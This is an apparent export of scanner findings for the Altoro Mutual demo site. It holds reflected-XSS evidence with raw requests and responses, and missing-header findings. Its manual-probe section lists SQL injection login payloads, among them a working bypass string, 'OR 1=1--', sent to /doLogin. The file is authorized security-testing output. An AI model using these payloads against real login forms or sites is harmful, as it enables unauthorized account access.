# SENTINEL v4.2.1 — INDEPENDENT VERIFICATION PACKAGES
Generated 2026-10-03 from live scans of the DECLARED AUTHORIZED TARGETS only
(engine: build-v421, sentinel-core/4.2.1, request journal v4.2.1).

## What this file is — and what it is NOT
- For every finding the engine produced on these targets, this file carries:
  the vulnerability type, the URL and parameter, the engine's verdict,
  the evidence chain as the engine recorded it, the RAW request/response
  pairs (exactly as issued/received, from the scan's request journal), and
  the Evidence-OS reproduction recipe.
- NO human or external judgment has been applied. The verdicts below are the
  ENGINE's, presented raw so that an external party who never ran the tool
  can verify each finding independently: replay the raw requests as issued.
- Raw requests carry the session cookies of the scan (demo/test accounts on
  authorized public test sites); handle the file accordingly.
- Honest limits: browser-channel findings (xss_dom) carry browser execution
  steps instead of journaled HTTP pairs; out-of-band confirmations (xxe) are
  in the verification notes and the OAST stats. Findings whose raw pair is
  absent from the journal are marked `journal:miss` — never silently dropped.
- Scope: every scan ran within its target's declared authorization only
  (engine-enforced scope: host-pinned, private ranges blocked, redirects
  re-checked per hop, rate-limit backoff honored — see per-target stats).


---

# TARGET: http://demo.testfire.net  (testfire)

Authorization basis: IBM/Akamai public demo application (Altoro Mutual), provided for security testing.

Scan record (as-run, unedited):
- run_id: run-6a6418ab8d | seed: 55136a9e | scanner: sentinel-core/4.2.1
- profile: see the raw scan JSON at build-v421/results/live_v421/testfire.json
- requests: 366 | duration: 303.23s | rate_limit: {"limited": 0, "retries": 0, "recovered": 0}
- journal: 366 entries | dropped: 0
- OAST: {}
- engine verdict tally (as-is): 36 findings / 0 rejected / 0 unverified


### Independent environment observations — doLogin (manual curl probes, NOT engine output)
Target drift recorded live on 2026-10-03 while building this package; every
probe below is a raw manual curl command and its raw result. They describe
the TARGET's behavior only; no adjudication of the engine is implied.

- `POST /doLogin` with `uid=1' OR '1'='1' --` (string-quote tautology, the
  engine's probe family — journal entries #7/#14) -> `302 login.jsp` (no bypass)
- `POST /doLogin` with `uid=1' OR '1'='2' --` -> `302 login.jsp`
- `POST /doLogin` with `uid=' OR 1=1--` (numeric tautology + comment) ->
  `302 http://demo.testfire.net/bank/main.jsp` (BYPASS STILL ALIVE)
- `POST /doLogin` with `uid=' or 'a'='a` -> `302 login.jsp`
- `POST /doLogin` with `uid=admin'--` -> connection timeout on that attempt
- `GET /bank/main.jsp` unauthenticated -> `302 login.jsp`
- Journal entry #7 of the engine's own battery (string-tautology TRUE probe)
  hit a transport timeout and is recorded as such in the raw journal.

Consequence (fact, not judgment): the engine's journaled battery contains the
string-quote family only; the numeric-comment family that currently bypasses
the login is absent from the battery, and the engine honestly reported no
differential. The raw journal below lets any third party confirm both halves.


## [TESTFIRE F01] xss_reflected — high (engine verdict: verified)

- Surface: GET http://demo.testfire.net/index.jsp (parameter: `content`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 5/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: … 		 			 			<p>Failed due to The requested resource (/static/<sentinelxssmarker>pro41</sentinelxssmarker>) is not available</p>  		    … [ctx: … 		 			 			<p>Failed due to The requested resource (/static/<sentinelxssmarker>pro41</sentinelxssmarker>) is not available<
    * [unescaped_reflection] canary reflected raw in context: … 		 			 			<p>Failed due to The requested resource (/static/<sentinelxssmarkerpro42) is not available</p>  		    … [ctx: … 		 			 			<p>Failed due to The requested resource (/static/<sentinelxssmarkerpro42) is not available</p>  		    …]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-459ad7b3 (exactly as issued by the engine) ---
  GET /index.jsp?content=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6842
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:43 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 363.8
  --- RAW REQUEST req-5d336ce3 (exactly as issued by the engine) ---
  GET /index.jsp?content=%3Csentinelxssmarkerpro42
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6821
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:46 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 370.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/index.jsp with the tested parameter 'content' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [TESTFIRE F02] xss_reflected — high (engine verdict: verified)

- Surface: GET http://demo.testfire.net/search.jsp (parameter: `query`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 6/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: … 		<p>No results were found for the query:<br /><br /> 		 		<sentinelxssmarker>pro41</sentinelxssmarker> 		 		</div>         </td>	 </… [ctx: … 		<p>No results were found for the query:<br /><br /> 		 		<sentinelxssmarker>pro41</sentinelxssmarker> 		 		</div>       
    * [unescaped_reflection] canary reflected raw in context: … 		<p>No results were found for the query:<br /><br /> 		 		<sentinelxssmarkerpro42 		 		</div>         </td>	 </… [ctx: … 		<p>No results were found for the query:<br /><br /> 		 		<sentinelxssmarkerpro42 		 		</div>         </td>	 </…]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-b6b1abfd (exactly as issued by the engine) ---
  GET /search.jsp?query=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6906
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:12 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 383.7
  --- RAW REQUEST req-2aa1459d (exactly as issued by the engine) ---
  GET /search.jsp?query=%3Csentinelxssmarkerpro42
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6885
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:15 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 395.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/search.jsp with the tested parameter 'query' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [TESTFIRE F03] xss_reflected — high (engine verdict: verified)

- Surface: POST http://demo.testfire.net/sendFeedback (parameter: `name`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 6/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: …	 <h1>Thank You</h1> 		  		 <p>Thank you for your comments, <sentinelxssmarker>pro41</sentinelxssmarker>.  They will be reviewed by ou… [ctx: …	 <h1>Thank You</h1> 		  		 <p>Thank you for your comments, <sentinelxssmarker>pro41</sentinelxssmarker>.  They will be rev
    * [unescaped_reflection] canary reflected raw in context: …	 <h1>Thank You</h1> 		  		 <p>Thank you for your comments, <sentinelxssmarkerpro42.  They will be reviewed by ou… [ctx: …	 <h1>Thank You</h1> 		  		 <p>Thank you for your comments, <sentinelxssmarkerpro42.  They will be reviewed by ou…]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8996a93d (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E&email_addr=sentinel&subject=sentinel&comments=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7093
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:35 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 389.5
  --- RAW REQUEST req-d6a16653 (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=%3Csentinelxssmarkerpro42&email_addr=sentinel&subject=sentinel&comments=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7072
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:37 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 374.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/sendFeedback with the tested parameter 'name' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [TESTFIRE F04] xss_reflected — high (engine verdict: verified)

- Surface: POST http://demo.testfire.net/sendFeedback (parameter: `email_addr`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 4/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: … deserve.  		  			However, the email you gave is incorrect (<sentinelxssmarker>pro41</sentinelxssmarker>) and you will not receive a r… [ctx: … deserve.  		  			However, the email you gave is incorrect (<sentinelxssmarker>pro41</sentinelxssmarker>) and you will not 
    * [unescaped_reflection] canary reflected raw in context: … deserve.  		  			However, the email you gave is incorrect (<sentinelxssmarkerpro42) and you will not receive a r… [ctx: … deserve.  		  			However, the email you gave is incorrect (<sentinelxssmarkerpro42) and you will not receive a r…]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-4ded125f (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=sentinel&email_addr=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E&subject=sentinel&comments=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7093
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:40 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 358.4
  --- RAW REQUEST req-edefaee1 (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=sentinel&email_addr=%3Csentinelxssmarkerpro42&subject=sentinel&comments=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7072
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:42 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 368.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/sendFeedback with the tested parameter 'email_addr' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [TESTFIRE F05] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-609b3a2d (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:36 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 367.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F06] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/style.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-50c19c77 (exactly as issued by the engine) ---
  GET /style.css
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 1165
    content-type: text/css
    date: Sat, 03 Oct 2026 00:58:37 GMT
    etag: W/"1165-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    body, table, td, p  {
    	color:#000000;
    	font: 10px Verdana, Arial, Sans-Serif;
    	line-height: 1.6;
    }
    img {
    	border-style: none;
    	border-width: 0px;
    }
    form {
    	margin-top: 0;
    	margin-bottom: 0;
    ... [74 more lines, 1164 chars total]
  elapsed_ms: 374.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/style.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F07] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/index.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d94f2968 (exactly as issued by the engine) ---
  GET /index.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:37 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 371.6
  --- RAW REQUEST req-7d285b44 (exactly as issued by the engine) ---
  GET /index.jsp?content=business.htm
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:40 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 377.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/index.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F08] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/login.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-5b436842 (exactly as issued by the engine) ---
  GET /login.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:38 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 375.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/login.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F09] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/feedback.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a40960bd (exactly as issued by the engine) ---
  GET /feedback.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:54 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
        
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    ... [66 more lines, 3999 chars total]
  elapsed_ms: 373.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/feedback.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F10] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/cgi.exe (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-db5dcaca (exactly as issued by the engine) ---
  GET /cgi.exe
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 404
  headers:
    content-length: 6821
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:55 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3997 chars total]
  elapsed_ms: 363.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/cgi.exe as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F11] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/subscribe.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f6527a2b (exactly as issued by the engine) ---
  GET /subscribe.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:56 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 366.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/subscribe.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F12] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/default.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-1c4a4186 (exactly as issued by the engine) ---
  GET /default.jsp?content=security.htm
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 404
  headers:
    content-length: 6821
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:57 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3997 chars total]
  elapsed_ms: 371.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/default.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F13] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/survey_questions.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
